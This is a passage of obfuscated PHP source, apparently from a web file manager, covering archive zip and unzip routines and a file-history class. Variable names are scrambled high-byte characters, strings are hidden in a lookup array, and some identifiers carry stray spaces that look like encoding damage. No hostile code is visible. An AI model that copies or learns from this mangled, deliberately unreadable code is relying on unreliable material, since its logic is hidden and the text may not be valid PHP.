$°šŸúí½[$·ÚĞñÚÒ[652]][] = $ß­ªß…è[$·ÚĞñÚÒ[561]]; } $İŸöŸÕê[] = $this->_makeItemData($ß­ªß…è, $İ«¼÷‘, $ß­ªß…è[$·ÚĞñÚÒ[42]]); } unset($ß­ªß…è); if (!empty($İŸöŸÕê)) { $this->addAll($İŸöŸÕê); $this->_childrenListSelect($ïÈÖ´¸È); } $öĞâÜíû = $this->_childrenList($ïÈÖ´¸È); $öĞâÜíû = array_to_keyvalue($öĞâÜíû, $·ÚĞñÚÒ[42]); foreach ($”ã£›Ñ´ as $ß­ªß…è) { $úóŒı—Ã = $öĞâÜíû[$ß­ªß…è[$·ÚĞñÚÒ[42]]]; $òÊ‘ÜŸ˜ = $úóŒı—Ã[$·ÚĞñÚÒ[202]]; $this->_copyApplyMeta($úóŒı—Ã, $°šŸúí½); if ($ß­ªß…è[$·ÚĞñÚÒ[43]] == $·ÚĞñÚÒ[88]) { $ß­ªß…è[$·ÚĞñÚÒ[97]] = $°¹¡‹ş¢->getPathInner($ß­ªß…è[$·ÚĞñÚÒ[97]]); $this->_copyChildTo($°¹¡‹ş¢, $ß­ªß…è[$·ÚĞñÚÒ[97]], $òÊ‘ÜŸ˜, $«•’ÉáÆ, $°šŸúí½, $ Àƒ½â­, $şúı ‹); } } } private function _addFiles($ “²š³, $·¿•À®İ, $ƒ¯ÀÌÆ, $›¼‘Ó¿ø) { $—ûŒ‡©Š =& $_SERVER[‰‰Ş‚€]; if (!$ƒ¯ÀÌÆ || count($ƒ¯ÀÌÆ) == 0) { return array(); } $ŒĞè£ó = array(); foreach ($ƒ¯ÀÌÆ as &$¦÷˜Ôí•) { Hook::trigger($—ûŒ‡©Š[694], $¦÷˜Ôí•); $¦÷˜Ôí•[$—ûŒ‡©Š[97]] = $ “²š³->getPathInner($¦÷˜Ôí•[$—ûŒ‡©Š[97]]); $úÑşçú = $ “²š³->hashSimple($¦÷˜Ôí•[$—ûŒ‡©Š[97]]); $ò­ïñ = $ “²š³->hashMd5($¦÷˜Ôí•[$—ûŒ‡©Š[97]]); if (strlen($ò­ïñ) > 10 && !isset($ŒĞè£ó[$ò­ïñ])) { $ŒĞè£ó[$ò­ïñ] = array(); } $¦÷˜Ôí•[$—ûŒ‡©Š[695]] = $úÑşçú; $¦÷˜Ôí•[$—ûŒ‡©Š[567]] = $ò­ïñ; $ŒĞè£ó[$ò­ïñ][] =& $¦÷˜Ôí•; if (count($ŒĞè£ó[$ò­ïñ]) > 1) { $¦÷˜Ôí•[$—ûŒ‡©Š[693]] = !0; } Hook::trigger($—ûŒ‡©Š[696], $¦÷˜Ôí•); } unset($¦÷˜Ôí•); $¿¶™üõç = array($—ûŒ‡©Š[567] => array($—ûŒ‡©Š[17], array_keys($ŒĞè£ó))); $…„àÀÎû = Model($—ûŒ‡©Š[697]); $ÁÃ§Úšù = $…„àÀÎû->where($¿¶™üõç)->select(); $ÁÃ§Úšù = $ÁÃ§Úšù ? $ÁÃ§Úšù : array(); foreach ($ÁÃ§Úšù as $æ ºç¼) { if (!isset($ŒĞè£ó[$æ ºç¼[$—ûŒ‡©Š[567]]])) { continue; } $ïó‚•» = $ŒĞè£ó[$æ ºç¼[$—ûŒ‡©Š[567]]]; foreach ($ïó‚•» as &$¦÷˜Ôí•) { $¦÷˜Ôí•[$—ûŒ‡©Š[561]] = $æ ºç¼[$—ûŒ‡©Š[561]]; $¦÷˜Ôí•[$—ûŒ‡©Š[693]] = !0; } unset($¦÷˜Ôí•); } $ã¥¾’Ïë = array(); foreach ($ƒ¯ÀÌÆ as $·®À ƒå) { Hook::trigger($—ûŒ‡©Š[698], $·®À ƒå); if (isset($·®À ƒå[$—ûŒ‡©Š[693]]) && $·®À ƒå[$—ûŒ‡©Š[693]]) { Hook::trigger($—ûŒ‡©Š[699], $·®À ƒå); continue; } $Š×ª¢Êµ = $ “²š³->getPathInner($·®À ƒå[$—ûŒ‡©Š[97]]); $şÒ€Ê¢Ò = $…„àÀÎû->addFileMake($Š×ª¢Êµ, $·¿•À®İ, $·®À ƒå[$—ûŒ‡©Š[89]], $·®À ƒå[$—ûŒ‡©Š[695]], $·®À ƒå[$—ûŒ‡©Š[567]], $·®À ƒå[$—ûŒ‡©Š[42]], $›¼‘Ó¿ø); Hook::trigger($—ûŒ‡©Š[699], $·®À ƒå); if (!is_array($şÒ€Ê¢Ò)) { continue; } $ã¥¾’Ïë[] = $şÒ€Ê¢Ò; } $…„àÀÎû->addAll($ã¥¾’Ïë); $¿¶™üõç = array($—ûŒ‡©Š[567] => array($—ûŒ‡©Š[17], array_keys($ŒĞè£ó))); $ÁÃ§Úšù = $…„àÀÎû->where($¿¶™üõç)->select(); $ÁÃ§Úšù = $ÁÃ§Úšù ? $ÁÃ§Úšù : array(); foreach ($ÁÃ§Úšù as $æ ºç¼) { if (!isset($ŒĞè£ó[$æ ºç¼[$—ûŒ‡©Š[567]]])) { continue; } $úúœ§› =& $ŒĞè£ó[$æ ºç¼[$—ûŒ‡©Š[567]]]; foreach ($úúœ§› as &$¦÷˜Ôí•) { $¦÷˜Ôí•[$—ûŒ‡©Š[561]] = $æ ºç¼[$—ûŒ‡©Š[561]]; } unset($¦÷˜Ôí•); } $Œ”çÎò = array(); foreach ($ƒ¯ÀÌÆ as $ã°èÜ•Ø) { $Œ”çÎò[$ã°èÜ•Ø[$—ûŒ‡©Š[42]]] = $ã°èÜ•Ø; } return $Œ”çÎò; } } define($_SERVER[‰‰Ş‚€][700], $_SERVER[‰‰Ş‚€][701]); $vzxlnqapie = $_SERVER[‰‰Ş‚€][702]; goto e§­™¡«–Ú; Eøµê’Ø­Ë: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ƒ”êèàÎ; if ($ƒ”êèàÎ) { return $ƒ”êèàÎ; } $­‚îŸ‡ = IO::init($_SERVER[‰‰Ş‚€][18]); return $­‚îŸ‡; } private static function iconvSystem($ğ‹Ò¸¶) { return self::local()->iconvSystem($ğ‹Ò¸¶); } private static function iconvApp($“Æœü¿õ) { return self::local()->iconvApp($“Æœü¿õ); } public static function zipFolder($ÔÜ¥şÒ³, $‰ÎÄ²šğ = "\x7a\151\x70", $Ü±ßôõõ = '', $à×‘Â ¸ = REPEAT_RENAME) { $™œµËÂï =& $_SERVER[‰‰Ş‚€]; $ÓüÃˆ = IO::listPath($ÔÜ¥şÒ³); if (!$ÓüÃˆ) { return !1; } $ÓüÃˆ = array_merge($ÓüÃˆ[$™œµËÂï[95]], $ÓüÃˆ[$™œµËÂï[96]]); return self::zip($ÓüÃˆ, $‰ÎÄ²šğ, $Ü±ßôõõ, $à×‘Â ¸); } public static function zip($Ì¸øóô¢, $‚§Ñ™ï = "\x7a\151\160", $·©¼òóŞ = '', $şîàÎ© = REPEAT_RENAME) { $¥‹µÍúÎ =& $_SERVER[‰‰Ş‚€]; if (is_string($Ì¸øóô¢) && $Ì¸øóô¢) { $Ì¸øóô¢ = array(array($¥‹µÍúÎ[97] => $Ì¸øóô¢)); } $çñ ¾ÚŸ = self::init($Ì¸øóô¢[0][$¥‹µÍúÎ[97]]); $Æ¾ƒÕ§’ = self::info($Ì¸øóô¢[0][$¥‹µÍúÎ[97]]); $¸¨¬õÜÆ = $¥‹µÍúÎ[22]; $î´ÖşÏÌ = $¥‹µÍúÎ[22]; $§æêó‹ = $¥‹µÍúÎ[22]; if ($·©¼òóŞ && substr($·©¼òóŞ, -1, 1) != $¥‹µÍúÎ[18]) { $î´ÖşÏÌ = get_path_father($·©¼òóŞ); $§æêó‹ = get_path_this($·©¼òóŞ); } else { $î´ÖşÏÌ = self::pathFather($Æ¾ƒÕ§’[$¥‹µÍúÎ[97]]); $§æêó‹ = $Æ¾ƒÕ§’[$¥‹µÍúÎ[42]] . $¥‹µÍúÎ[20] . $‚§Ñ™ï; if (count($Ì¸øóô¢) > 1) { $âµÎ‰‹ù = IO::info($î´ÖşÏÌ); $§æêó‹ = $âµÎ‰‹ù[$¥‹µÍúÎ[42]] . $¥‹µÍúÎ[20] . $‚§Ñ™ï; } if ($·©¼òóŞ) { $î´ÖşÏÌ = $·©¼òóŞ; } } if ($çñ ¾ÚŸ->getType() == $¥‹µÍúÎ[117]) { $Ö¨¢ø´ş = self::init($î´ÖşÏÌ); $»â´×Ö™ = $Ö¨¢ø´ş->getType() == $¥‹µÍúÎ[117] ? $î´ÖşÏÌ : get_path_father($çñ ¾ÚŸ->path); $»â´×Ö™ = IO::getPathInner($»â´×Ö™); $»â´×Ö™ = rtrim($»â´×Ö™, $¥‹µÍúÎ[18]) . $¥‹µÍúÎ[18]; mk_dir($»â´×Ö™); } else { $¸¨¬õÜÆ = TEMP_FILES . $¥‹µÍúÎ[1304] . time() . rand_string(8) . $¥‹µÍúÎ[18]; mk_dir($¸¨¬õÜÆ); file_put_contents($¸¨¬õÜÆ . $¥‹µÍúÎ[1305], $¥‹µÍúÎ[22]); $»â´×Ö™ = $¸¨¬õÜÆ; } $¥ÑÆ¶£å = IO::info($»â´×Ö™); if (!$¥ÑÆ¶£å || !$¥ÑÆ¶£å[$¥‹µÍúÎ[244]]) { show_json(LNG($¥‹µÍúÎ[1306]), !1); } $Ô˜‹²¯ = self::zipFileList($Ì¸øóô¢, $¸¨¬õÜÆ); foreach ($Ô˜‹²¯ as $¤¦ºÑÆÍ => $›­Â÷²ç) { $Ô˜‹²¯[$¤¦ºÑÆÍ] = self::iconvSystem($›­Â÷²ç); } $Ëêáõş = get_filename_auto($»â´×Ö™ . $§æêó‹, $¥‹µÍúÎ[22], $şîàÎ©); KodArchive::create(self::iconvSystem($Ëêáõş), $Ô˜‹²¯); if (!IO::exist($Ëêáõş)) { if ($¸¨¬õÜÆ) { del_dir($¸¨¬õÜÆ); } write_log($¥‹µÍúÎ[1307] . $Ëêáõş, $¥‹µÍúÎ[397]); show_json(LNG($¥‹µÍúÎ[1308]), !1); } if (!$¸¨¬õÜÆ) { return $Ëêáõş; } $Õ¼— ÉÍ = self::move($Ëêáõş, $î´ÖşÏÌ, $şîàÎ©); if ($¸¨¬õÜÆ) { del_dir($¸¨¬õÜÆ); } if (!$Ëêáõş) { write_log($¥‹µÍúÎ[1309] . $Ëêáõş . $¥‹µÍúÎ[1310] . $î´ÖşÏÌ, $¥‹µÍúÎ[397]); show_json(LNG($¥‹µÍúÎ[1308]), !1); } return $Õ¼— ÉÍ; } public static function unzip($ÄÀ¶Âµš, $È·×µ—, $ç“ÍÕĞ’ = "\x2d\x31", $ñ†ì¸ºõ = "\x72\x65\160\154\x61\x63\145") { $´ì¢™ØÙ =& $_SERVER[‰‰Ş‚€]; $È˜şï« = parent::info($ÄÀ¶Âµš); if (!$È˜şï«) { show_json(LNG($´ì¢™ØÙ[1311]), !1); } $ÑÊ÷±Ô¤ = IO::infoFullSimple($È·×µ—); if (!$ÑÊ÷±Ô¤) { $È·×µ— = IO::mkdir($È·×µ—); } if (isset($ÑÊ÷±Ô¤[$´ì¢™ØÙ[202]]) && trim($ÑÊ÷±Ô¤[$´ì¢™ØÙ[97]], $´ì¢™ØÙ[18]) != trim($È·×µ—, $´ì¢™ØÙ[18])) { $–Ó¨Šê³ = KodIO::make($ÑÊ÷±Ô¤[$´ì¢™ØÙ[201]]); $°Çƒ‰şº = IO::fileNameAuto($–Ó¨Šê³, $ÑÊ÷±Ô¤[$´ì¢™ØÙ[42]], REPEAT_RENAME_FOLDER, !0); $È·×µ— = IO::mkdir($–Ó¨Šê³ . $°Çƒ‰şº); } $ç“ÍÕĞ’ = $ç“ÍÕĞ’ && $ç“ÍÕĞ’ != $´ì¢™ØÙ[1312] ? @json_decode($ç“ÍÕĞ’, !0) : -1; $ïš‰Œ£ = self::unzipPart($ÄÀ¶Âµš, $ç“ÍÕĞ’); if (!$ïš‰Œ£ || !IO::exist($ïš‰Œ£[$´ì¢™ØÙ[241]])) { show_json(LNG($´ì¢™ØÙ[116]), !1); } $Ö¹ïÔşÍ = $ïš‰Œ£[$´ì¢™ØÙ[1313]][count($ïš‰Œ£[$´ì¢™ØÙ[1313]]) - 1]; if ($Ö¹ïÔşÍ[$´ì¢™ØÙ[1314]] == -1 || substr($Ö¹ïÔşÍ[$´ì¢™ØÙ[42]], -1, 1) == $´ì¢™ØÙ[18]) { $Ö…‚œóâ = $ïš‰Œ£[$´ì¢™ØÙ[1315]] . rand_string(10) . $´ì¢™ØÙ[18]; mk_dir($Ö…‚œóâ); $©Ë€õÚ– = count($ïš‰Œ£[$´ì¢™ØÙ[1313]]) == 1 ? IO::ext($ÄÀ¶Âµš) : get_path_ext($ïš‰Œ£[$´ì¢™ØÙ[241]]); $â³ßñ Á = KodArchive::extract(self::iconvSystem($ïš‰Œ£[$´ì¢™ØÙ[241]]), $Ö…‚œóâ, $Ö¹ïÔşÍ[$´ì¢™ØÙ[1314]], $°Çƒ‰şº, $©Ë€õÚ–); self::unzipErrorCheck($â³ßñ Á, array($´ì¢™ØÙ[1316], $ÄÀ¶Âµš, $©Ë€õÚ–, $È·×µ—, $ïš‰Œ£)); Hook::trigger($´ì¢™ØÙ[1317], $Ö…‚œóâ); recursion_dir($Ö…‚œóâ, $çş¥¥²˜, $í„ŞÎşß, 0); $ÛÜ´øŸÔ = array_merge($çş¥¥²˜, $í„ŞÎşß); $Å¯®¦ª = array(); foreach ($ÛÜ´øŸÔ as $ä˜ÔŞËû) { $®–Ş§  = IO::move(self::iconvApp($ä˜ÔŞËû), $È·×µ—, $ñ†ì¸ºõ); if ($®–Ş§ ) { $Å¯®¦ª[] = $®–Ş§ ; } } del_dir($Ö…‚œóâ); } else { $®–Ş§  = IO::move($ïš‰Œ£[$´ì¢™ØÙ[241]], $È·×µ—, $ñ†ì¸ºõ, get_path_this($Ö¹ïÔşÍ[$´ì¢™ØÙ[42]])); if ($®–Ş§ ) { $Å¯®¦ª[] = $®–Ş§ ; } } return $Å¯®¦ª ? $Å¯®¦ª : !1; } public static function unzipList($‘ùÈüå¨) { $‹ì¿±Œ— =& $_SERVER[‰‰Ş‚€]; $¥ÙºâŒó = isset($‘ùÈüå¨[$‹ì¿±Œ—[1318]]) ? $‘ùÈüå¨[$‹ì¿±Œ—[1318]] : !1; $îÁ«½²¹ = isset($‘ùÈüå¨[$‹ì¿±Œ—[1314]]) ? @json_decode($‘ùÈüå¨[$‹ì¿±Œ—[1314]], !0) : -1; $Î©¾˜ã£ = self::unzipPart($‘ùÈüå¨[$‹ì¿±Œ—[97]], $îÁ«½²¹); if (!$Î©¾˜ã£ || !IO::exist($Î©¾˜ã£[$‹ì¿±Œ—[241]])) { show_json(LNG($‹ì¿±Œ—[116]), !1); } $„™ß¡½Ä = $Î©¾˜ã£[$‹ì¿±Œ—[1313]][count($Î©¾˜ã£[$‹ì¿±Œ—[1313]]) - 1]; $À³«†Ş = in_array(IO::ext($Î©¾˜ã£[$‹ì¿±Œ—[241]]), array($‹ì¿±Œ—[397], $‹ì¿±Œ—[1319], $‹ì¿±Œ—[1320], $‹ì¿±Œ—[1321], $‹ì¿±Œ—[1322], $‹ì¿±Œ—[1323])); if (!$¥ÙºâŒó && ($„™ß¡½Ä[$‹ì¿±Œ—[1314]] == -1 || $À³«†Ş)) { $Šµı÷¬â = $Î©¾˜ã£[$‹ì¿±Œ—[1315]] . get_path_this($Î©¾˜ã£[$‹ì¿±Œ—[241]]) . $‹ì¿±Œ—[1324]; if (!IO::exist($Šµı÷¬â)) { $Ë…â”ú´ = $„™ß¡½Ä[$‹ì¿±Œ—[1314]] == -1 ? get_path_ext(IO::pathThis($‘ùÈüå¨[$‹ì¿±Œ—[97]])) : get_path_ext($Î©¾˜ã£[$‹ì¿±Œ—[241]]); $ÛØô÷ô = KodArchive::listContent(self::iconvSystem($Î©¾˜ã£[$‹ì¿±Œ—[241]]), !0, $Ë…â”ú´); self::unzipErrorCheck($ÛØô÷ô, array($‹ì¿±Œ—[1325], $‘ùÈüå¨, $Î©¾˜ã£)); @file_put_contents($Šµı÷¬â, json_encode($ÛØô÷ô[$‹ì¿±Œ—[1326]])); } return @json_decode(IO::getContent($Šµı÷¬â), !0); } IO::fileOut($Î©¾˜ã£[$‹ì¿±Œ—[241]], $¥ÙºâŒó, get_path_this($„™ß¡½Ä[$‹ì¿±Œ—[42]])); die; } private static function zipFileList($ßäõÑ“‚, $º‡‡éÑµ = false) { $¾›³È±ç =& $_SERVER[‰‰Ş‚€]; $ğ»şÙÃ = array(); foreach ($ßäõÑ“‚ as $àÆÒÔ©) { $îŸºˆº¸ = $àÆÒÔ©[$¾›³È±ç[97]]; if ($º‡‡éÑµ) { $îŸºˆº¸ = self::copy($àÆÒÔ©[$¾›³È±ç[97]], $º‡‡éÑµ, $¾›³È±ç[923]); } else { $ÒºõäÈá = self::init($àÆÒÔ©[$¾›³È±ç[97]]); if ($ÒºõäÈá->getType() == $¾›³È±ç[117]) { $îŸºˆº¸ = $ÒºõäÈá->path; } } if ($îŸºˆº¸ && self::local()->exist($îŸºˆº¸)) { $ğ»şÙÃ[$àÆÒÔ©[$¾›³È±ç[97]]] = $îŸºˆº¸; } } if (!empty($ğ»şÙÃ)) { return array_values($ğ»şÙÃ); } show_json(LNG($¾›³È±ç[1283]), !1); } private static function localFilePath($ûÈéçí) { $ª˜˜øÌ¯ =& $_SERVER[‰‰Ş‚€]; $´¦ûÌ²ã = KodIO::parse($ûÈéçí); if ($´¦ûÌ²ã[$ª˜˜øÌ¯[43]] == KodIO::KOD_SOURCE) { $ä¹ÂÓ = Model($ª˜˜øÌ¯[929])->fileInfoGet(KodIO::sourceID($ûÈéçí)); if (!$ä¹ÂÓ[$ª˜˜øÌ¯[97]]) { show_json($ª˜˜øÌ¯[1327], !1); } $ûÈéçí = $ä¹ÂÓ[$ª˜˜øÌ¯[97]]; } $•Íå•¸ = self::init($ûÈéçí); if ($•Íå•¸->pathParse[$ª˜˜øÌ¯[1269]]) { $ûÈéçí = $•Íå•¸->pathParse[$ª˜˜øÌ¯[1269]]; $•Íå•¸ = self::init($ûÈéçí); } $è«øŸ…ã = $•Íå•¸->getType(); if ($è«øŸ…ã == $ª˜˜øÌ¯[117] || $è«øŸ…ã == $ª˜˜øÌ¯[1328]) { if (!$•Íå•¸->exist($•Íå•¸->path)) { show_json(LNG($ª˜˜øÌ¯[116]), !1); } return $•Íå•¸->path; } return !1; } public static function unzipPart($­úíáß”, $£¸î×ğ = -1) { $ä™ÓŞˆÀ =& $_SERVER[‰‰Ş‚€]; $†å“üëâ = IO::pathThis($­úíáß”); if (!$£¸î×ğ || $£¸î×ğ == -1) { $©Š¦ĞŒÌ = array(array($ä™ÓŞˆÀ[42] => $†å“üëâ, $ä™ÓŞˆÀ[1314] => -1)); $©Š¦ĞŒÌ[0][$ä™ÓŞˆÀ[1329]] = $©Š¦ĞŒÌ[0][$ä™ÓŞˆÀ[42]]; } else { if (is_array($£¸î×ğ)) { $©Š¦ĞŒÌ = $£¸î×ğ; $Ò³ï£¢ğ = count($©Š¦ĞŒÌ) - 1; for ($ÍÈ±º¯¯ = 0; $ÍÈ±º¯¯ <= $Ò³ï£¢ğ; $ÍÈ±º¯¯++) { $ØÔÈµ„ = $©Š¦ĞŒÌ[$ÍÈ±º¯¯]; $‚åÛÎê  = get_path_this($ØÔÈµ„[$ä™ÓŞˆÀ[42]]) . (checkExtSafe($ØÔÈµ„[$ä™ÓŞˆÀ[42]]) ? $ä™ÓŞˆÀ[22] : $ä™ÓŞˆÀ[1330]); $©Š¦ĞŒÌ[$ÍÈ±º¯¯][$ä™ÓŞˆÀ[1329]] = $ä™ÓŞˆÀ[1331] . intval($ØÔÈµ„[$ä™ÓŞˆÀ[1314]]) . $ä™ÓŞˆÀ[481] . $‚åÛÎê ; if ($ÍÈ±º¯¯ == 0) { continue; } $©Š¦ĞŒÌ[$ÍÈ±º¯¯][$ä™ÓŞˆÀ[1329]] = $©Š¦ĞŒÌ[$ÍÈ±º¯¯ - 1][$ä™ÓŞˆÀ[1329]] . $ä™ÓŞˆÀ[1332] . $©Š¦ĞŒÌ[$ÍÈ±º¯¯][$ä™ÓŞˆÀ[1329]]; } } } if (!is_array($©Š¦ĞŒÌ) || count($©Š¦ĞŒÌ) == 0) { return !1; } $ãÄ¿ôÃÑ = $©Š¦ĞŒÌ[count($©Š¦ĞŒÌ) - 1]; if (!IO::exist($­úíáß”)) { return !1; } $’Òó‡º§ = TEMP_FILES . $ä™ÓŞˆÀ[1333] . kodIO::hashPathSafe($­úíáß”) . $ä™ÓŞˆÀ[18]; $ÀÔÒÊôš = $’Òó‡º§ . $ãÄ¿ôÃÑ[$ä™ÓŞˆÀ[1329]]; mk_dir($’Òó‡º§); file_put_contents(TEMP_FILES . $ä™ÓŞˆÀ[1305], $ä™ÓŞˆÀ[22]); if (IO::exist($ÀÔÒÊôš)) { return array($ä™ÓŞˆÀ[241] => $ÀÔÒÊôš, $ä™ÓŞˆÀ[1313] => $©Š¦ĞŒÌ, $ä™ÓŞˆÀ[1315] => $’Òó‡º§); } $Í»¢ç¥° = self::localFilePath($­úíáß”); if (!$Í»¢ç¥°) { $Í»¢ç¥° = $’Òó‡º§ . $ä™ÓŞˆÀ[1334]; if (!IO::exist($Í»¢ç¥°)) { self::copy($­úíáß”, $’Òó‡º§, !1, get_path_this($Í»¢ç¥°)); } } if (!$Í»¢ç¥° || !IO::exist($Í»¢ç¥°)) { return !1; } if ($ãÄ¿ôÃÑ[$ä™ÓŞˆÀ[1314]] == -1) { return array($ä™ÓŞˆÀ[241] => $Í»¢ç¥°, $ä™ÓŞˆÀ[1313] => $©Š¦ĞŒÌ, $ä™ÓŞˆÀ[1315] => $’Òó‡º§); } $º‰œ–ˆ = $Í»¢ç¥°; foreach ($©Š¦ĞŒÌ as $ÍÈ±º¯¯ => $ØÔÈµ„) { if (!$ØÔÈµ„ || $ØÔÈµ„[$ä™ÓŞˆÀ[1314]] == $ä™ÓŞˆÀ[1312]) { break; } if (substr($ØÔÈµ„[$ä™ÓŞˆÀ[42]], -1, 1) == $ä™ÓŞˆÀ[18]) { break; } $Æ»Øß¦ï = in_array(get_path_ext($ØÔÈµ„[$ä™ÓŞˆÀ[1329]]), array($ä™ÓŞˆÀ[397], $ä™ÓŞˆÀ[1319], $ä™ÓŞˆÀ[1320], $ä™ÓŞˆÀ[1321], $ä™ÓŞˆÀ[1322], $ä™ÓŞˆÀ[1323])); $¾¸Ï²â‘ = $ÍÈ±º¯¯ == count($©Š¦ĞŒÌ) - 1 && $Æ»Øß¦ï; $·Ùß·ï = $’Òó‡º§ . $ØÔÈµ„[$ä™ÓŞˆÀ[1329]]; $Âõƒ»î… = $’Òó‡º§ . get_path_this($ØÔÈµ„[$ä™ÓŞˆÀ[42]]); if (IO::exist($·Ùß·ï)) { $º‰œ–ˆ = $·Ùß·ï; continue; } $»œÇÅ¨ü = $ÍÈ±º¯¯ == 0 ? get_path_ext($†å“üëâ) : get_path_ext($º‰œ–ˆ); $œƒİÎôâ = KodArchive::extract(self::iconvSystem($º‰œ–ˆ), $’Òó‡º§, $ØÔÈµ„[$ä™ÓŞˆÀ[1314]], $âáüœŠ—, $»œÇÅ¨ü); self::unzipErrorCheck($œƒİÎôâ, array($ä™ÓŞˆÀ[1335], $­úíáß”, $©Š¦ĞŒÌ, $ØÔÈµ„, $·Ùß·ï)); if (IO::exist($Âõƒ»î…)) { IO::rename($Âõƒ»î…, get_path_this($·Ùß·ï)); } $º‰œ–ˆ = $·Ùß·ï; } $ÀÔÒÊôš = $º‰œ–ˆ; return array($ä™ÓŞˆÀ[241] => $º‰œ–ˆ, $ä™ÓŞˆÀ[1313] => $©Š¦ĞŒÌ, $ä™ÓŞˆÀ[1315] => $’Òó‡º§); } private static function unzipErrorCheck($ Ê³å«ş, $ûÕ¾çùÔ = false) { $ù¤«û‰‹ =& $_SERVER[‰‰Ş‚€]; if ($ Ê³å«ş[$ù¤«û‰‹[1336]]) { return !0; } write_log(array($ù¤«û‰‹[1337], $ Ê³å«ş, $ûÕ¾çùÔ), $ù¤«û‰‹[1338]); $ÃÎÇËúƒ = is_array($ Ê³å«ş[$ù¤«û‰‹[1326]]) ? json_encode($ Ê³å«ş[$ù¤«û‰‹[1326]]) : $ Ê³å«ş[$ù¤«û‰‹[1326]]; show_json($ù¤«û‰‹[1339] . $ÃÎÇËúƒ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $æİ‰Ò€¹ =& $_SERVER[‰‰Ş‚€]; $†ˆ·®õê = $GLOBALS[$æİ‰Ò€¹[16]][$æİ‰Ò€¹[102]]; if ($†ˆ·®õê[$æİ‰Ò€¹[1340]] != 1) { return; } if ($†ˆ·®õê[$æİ‰Ò€¹[1341]] <= 0) { return; } if (isset($_REQUEST[$æİ‰Ò€¹[1342]]) && $_REQUEST[$æİ‰Ò€¹[1342]] == $æİ‰Ò€¹[101]) { return; } Hook::bind($æİ‰Ò€¹[1343], $æİ‰Ò€¹[1344]); Hook::bind($æİ‰Ò€¹[1345], $æİ‰Ò€¹[1346]); Hook::bind($æİ‰Ò€¹[1347], $æİ‰Ò€¹[1348]); Hook::bind($æİ‰Ò€¹[1349], $æİ‰Ò€¹[1350]); Hook::bind($æİ‰Ò€¹[1351], $æİ‰Ò€¹[1352]); Hook::bind($æİ‰Ò€¹[1353], $æİ‰Ò€¹[1354]); } public static function eventBeforeUpload($ÀÀÃÁ“) { if ($ÀÀÃÁ“[3] && $ÀÀÃÁ“[3] != REPEAT_REPLACE) { return; } $í‡€ÂÖÚ = self::parsePath($ÀÀÃÁ“[0]); if (!$í‡€ÂÖÚ) { return; } self::add($í‡€ÂÖÚ); } public static function eventBeforeEdit($ıªÓÆÁ) { $ÄÀíĞõØ = self::parsePath($ıªÓÆÁ[0]); if (!$ÄÀíĞõØ) { return; } self::add($ÄÀíĞõØ); } public static function eventBeforeCopyFile($°ºï‚¼÷, $Ô¸Ä©§ó, $ŸÁ³•˜, $ã³æ£áî, $ÅÆ°ÄÀ‰, $ø¹Çáâ) { $ß„‹ûöÎ =& $_SERVER[‰‰Ş‚€]; if (isset($ŸÁ³•˜->_data[$ß„‹ûöÎ[1273]]) && $ŸÁ³•˜->_data[$ß„‹ûöÎ[1273]]) { return; } $©ıïıÛ = $ŸÁ³•˜->getPathOuter($ã³æ£áî); $Š€©’ÉŸ = self::parsePath($©ıïıÛ); if (!$Š€©’ÉŸ) { return; } self::add($Š€©’ÉŸ); } public static function eventBeforeRename($¢´óı°„) { $ÀÍÒ¯Ç =& $_SERVER[‰‰Ş‚€]; $ª– •° = self::parsePath($¢´óı°„[0]); if (!$ª– •°) { return; } $Åë¿õİş = self::checkInHistory($ª– •°); if (!$Åë¿õİş) { return; } if ($Åë¿õİş[$ÀÍÒ¯Ç[43]] == $ÀÍÒ¯Ç[241]) { $âó¯¥Ü÷ = self::listData($ª– •°); if ($âó¯¥Ü÷ && $âó¯¥Ü÷[$ÀÍÒ¯Ç[454]]) { self::moveHistory($ª– •°, $¢´óı°„[1]); } } else { IO::rename($Åë¿õİş[$ÀÍÒ¯Ç[97]], $¢´óı°„[1]); } } public static function eventBeforeMove($¢ñ·›“Û) { $Àå³ÈÔâ =& $_SERVER[‰‰Ş‚€]; $¯Ë¯éá = self::parsePath($¢ñ·›“Û[0]); if (!$¯Ë¯éá) { return; } $Ø¦Å¼ü« = self::parsePath($¢ñ·›“Û[1]); if (!$Ø¦Å¼ü«) { return; } $†Ûò¹Ù = $¢ñ·›“Û[3]; $äåûßå = self::checkInHistory($¯Ë¯éá); if (!$äåûßå) { return; } $ªî–Ëƒ = self::pathHistory($Ø¦Å¼ü«); if ($äåûßå[$Àå³ÈÔâ[43]] == $Àå³ÈÔâ[241]) { $È÷µ¾ğº = self::listData($¯Ë¯éá); $Úã±á“İ = rtrim($Ø¦Å¼ü«, $Àå³ÈÔâ[18]) . $Àå³ÈÔâ[18] . ($†Ûò¹Ù ? $†Ûò¹Ù : get_path_this($¯Ë¯éá)); $†ôãÆã¿ = self::listData($Úã±á“İ); if ($È÷µ¾ğº && $È÷µ¾ğº[$Àå³ÈÔâ[454]] && $†ôãÆã¿ && $†ôãÆã¿[$Àå³ÈÔâ[454]]) { return self::clear($¯Ë¯éá); } if ($È÷µ¾ğº && $È÷µ¾ğº[$Àå³ÈÔâ[454]]) { self::moveHistory($¯Ë¯éá, $†Ûò¹Ù, $ªî–Ëƒ); } } else { IO::move($äåûßå[$Àå³ÈÔâ[97]], $ªî–Ëƒ, !1, $†Ûò¹Ù); self::clearEmptyFolder(IO::pathFather($äåûßå[$Àå³ÈÔâ[97]])); } } public static function eventAfterRemove($Ú­íÎéÀ, $Û£¹ÔÄ) { $»”»Ã˜È =& $_SERVER[‰‰Ş‚€]; if (!$Û£¹ÔÄ) { return; } $‡¿¶ôè¸ = self::parsePath($Ú­íÎéÀ[0]); if (!$‡¿¶ôè¸) { return; } $«Í˜Óˆ = self::checkInHistory($‡¿¶ôè¸); if (!$«Í˜Óˆ) { return; } if ($«Í˜Óˆ[$»”»Ã˜È[43]] == $»”»Ã˜È[241]) { $‰»º´ş = self::listData($‡¿¶ôè¸, !1); if ($‰»º´ş && $‰»º´ş[$»”»Ã˜È[454]]) { self::clear($‡¿¶ôè¸, !1); } } else { IO::remove($«Í˜Óˆ[$»”»Ã˜È[97]]); self::clearEmptyFolder(IO::pathFather($«Í˜Óˆ[$»”»Ã˜È[97]])); } } private static function checkInHistory($ªôøÕçÔ) { $Íœ˜Ö“· = self::pathHistory($ªôøÕçÔ); if (!IO::exist($Íœ˜Ö“·)) { $Íœ˜Ö“· .= $_SERVER[‰‰Ş‚€][1355]; } return IO::exist($Íœ˜Ö“·) ? IO::info($Íœ˜Ö“·) : !1; } private static function 